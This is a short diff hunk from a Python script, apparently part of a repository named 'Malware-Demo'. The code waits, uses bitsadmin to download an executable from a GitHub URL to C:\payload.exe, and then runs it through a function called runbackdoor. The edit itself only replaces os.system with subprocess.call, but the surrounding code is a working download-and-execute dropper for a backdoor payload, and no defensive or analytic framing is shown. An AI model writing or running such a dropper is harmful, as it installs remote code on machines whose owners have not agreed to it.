@@ -44,7 +44,7 @@ time.sleep(25)
 subprocess.call("bitsadmin /transfer mydownloadjob /download /priority FOREGROUND https://github.com/tnkrishnank/Malware-Demo/raw/main/e1234567891.exe C:\\payload.exe", shell=True)
 
 def runbackdoor():
-    os.system("C:\\payload.exe")
+    subprocess.call("C:\\payload.exe", shell=True)
 runbackdoor()
 
 sys.exit()
